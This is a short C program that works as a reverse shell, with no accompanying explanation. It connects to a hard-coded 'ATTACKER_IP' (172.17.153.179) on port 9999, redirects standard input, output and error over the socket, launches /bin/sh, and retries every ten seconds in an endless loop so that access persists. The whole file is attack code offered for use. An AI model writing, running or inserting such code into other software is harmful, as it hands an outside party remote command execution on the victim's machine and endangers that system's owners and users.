#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>

#define ATTACKER_IP "172.17.153.179"
#define ATTACKER_PORT 9999

void reverse_shell() {
    struct sockaddr_in addr;
    int sock = socket(AF_INET, SOCK_STREAM, 0);

    addr.sin_family = AF_INET;
    addr.sin_port = htons(ATTACKER_PORT);
    inet_pton(AF_INET, ATTACKER_IP, &addr.sin_addr);

    connect(sock, (struct sockaddr*)&addr, sizeof(addr));

    dup2(sock, 0); // stdin
    dup2(sock, 1); // stdout
    dup2(sock, 2); // stderr

    execl("/bin/sh", "sh", NULL);
}

int main() {
    while (1) {
        reverse_shell();
        sleep(10); // Reintentar cada 10 segundos si falla
    }
    return 0;
}